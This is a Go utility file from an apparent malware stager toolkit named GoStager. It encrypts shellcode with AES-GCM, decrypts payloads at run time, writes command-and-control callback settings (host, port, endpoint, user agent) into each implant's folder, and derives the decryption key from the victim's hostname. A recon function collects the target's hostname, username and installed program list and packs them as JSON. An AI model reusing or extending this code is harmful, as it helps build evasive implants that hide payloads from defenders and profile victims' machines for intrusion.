package util

import (
	"GoStager/config"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/json"
	"errors"
	"fmt"
	color "github.com/logrusorgru/aurora"
	"io"
	"io/ioutil"
	"log"
	"os"
)

type InitChecks struct {
	Hostname string   `json:"hostname"`
	Username string   `json:"username"`
	Dir      []string `json:"folders,flow"`
}

// ScToAES cypher the shellcode with AES
func ScToAES(path string, key string) ([]byte, error) {
	if len(key) != 32 {
		return nil, errors.New("the key needs to be 32 chars long")
	}
	byteKey := []byte(key)
	sc, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}
	aesPayload, _ := encrypt(sc, byteKey)
	return aesPayload, nil
}

// encrypt the payload with AES
func encrypt(plainText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}
	cypherText := gcm.Seal(nonce, nonce, plainText, nil)
	return cypherText, nil
}

// DecodeAES decode the payload with AES
func DecodeAES(cypherText []byte, key []byte) ([]byte, error) {
	if len(key) != 32 {
		return nil, errors.New("the key needs to be 32 chars long")
	}
	shellcode, err := decrypt(cypherText, key)
	if err != nil {
		return nil, err
	}
	return shellcode, nil
}

// decrypt the payload with AES
func decrypt(cypherText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	plainText, err := gcm.Open(nil, cypherText[:gcm.NonceSize()], cypherText[gcm.NonceSize():], nil)
	if err != nil {
		return nil, err
	}
	return plainText, nil
}

// GenerateConfig generate the config file for all the kitten
func GenerateConfig(conf config.General) error {
	data := fmt.Sprintf("http://%s:%d%s,%s", conf.GetHost(), conf.GetPort(), conf.GetEndpoint(), conf.GetUserAgent())
	for x := range conf.Conf.MalPath {
		err := ioutil.WriteFile(conf.Conf.MalPath[x]+"conf.txt", []byte(data), 0644)
		if err != nil {
			return err
		}
		fmt.Printf("%s %s\n", color.Green("[+] Generated conf file for"), color.Yellow(conf.Conf.MalPath[x]))
	}
	return nil
}

// ErrPrint print the error
func ErrPrint(err error) {
	if err != nil {
		log.Println(color.Red("[!] " + err.Error()))
	}
}

// GenerateKey generate the key with the hostname
func GenerateKey(hostname string, size int) string {
	// generate 32 char key
	key := hostname
	for len(key) < size {
		key = key + hostname
	}
	if len(key) > size {
		key = key[:size]
	}
	return key
}

// Recon does some basic recon on the target
func Recon() []byte {
	var iniCheck InitChecks
	// print machine name
	iniCheck.Hostname, _ = os.Hostname()
	//print username
	iniCheck.Username = os.Getenv("USERNAME")
	dir, _ := os.ReadDir("C:\\Program Files")
	for _, file := range dir {
		iniCheck.Dir = append(iniCheck.Dir, file.Name())
	}
	j, _ := json.Marshal(iniCheck)
	return j
}

// UnmarshalJSON unmarshal the json
func UnmarshalJSON(j []byte) InitChecks {
	var iniCheck InitChecks
	json.Unmarshal(j, &iniCheck)
	return iniCheck
}

// Contains check if a string is in a slice
func Contains(s []string, e string) bool {
	for _, a := range s {
		if a == e {
			return true
		}
	}
	return false
}
